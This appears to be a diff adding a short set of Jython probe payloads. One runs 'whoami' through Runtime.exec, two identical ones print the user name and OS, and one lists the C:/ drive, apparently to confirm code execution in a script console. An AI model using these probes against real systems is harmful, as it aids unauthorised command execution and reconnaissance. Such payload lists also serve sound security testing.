@@ -1,0 +1,14 @@
+from java.lang import Runtime; from java.util import Scanner
+print Scanner(Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\A").next()
+
+
+from java.lang import System
+print System.getProperty("user.name") + " / " + System.getProperty("os.name")
+
+
+from java.lang import System
+print System.getProperty("user.name") + " / " + System.getProperty("os.name")
+
+
+from java.io import File
+print File("C:/").list()
